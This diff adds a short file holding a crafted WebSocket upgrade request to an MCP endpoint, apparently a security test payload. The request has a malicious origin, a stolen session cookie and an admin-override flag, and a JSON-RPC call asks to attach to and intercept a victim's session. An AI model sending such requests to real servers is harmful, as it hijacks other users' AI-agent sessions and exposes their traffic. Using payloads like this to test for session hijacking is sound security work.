@@ -1,0 +1,10 @@
+WebSocket Upgrade for MCP Session:
+GET /mcp/ws HTTP/1.1
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Origin: https://malicious-origin.example.com
+Sec-WebSocket-Protocol: mcp-v1, mcp-admin
+Cookie: session=stolen_session_token_here; mcp_auth=admin_override
+
+{"jsonrpc":"2.0","method":"session/attach","params":{"target_session":"victim-session-id-12345","mode":"intercept"}}
